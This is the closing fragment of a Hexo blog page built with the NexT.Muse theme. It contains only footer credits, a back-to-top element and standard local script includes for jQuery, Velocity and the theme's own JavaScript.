  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.1.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.0"></script>

  <script src="/js/motion.js?v=7.1.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.1.0"></script>



  

  


  <script src="/js/next-boot.js?v=7.1.0"></script>


  

  

  

  



  




  

  

  
  

  
  
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  

  


  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
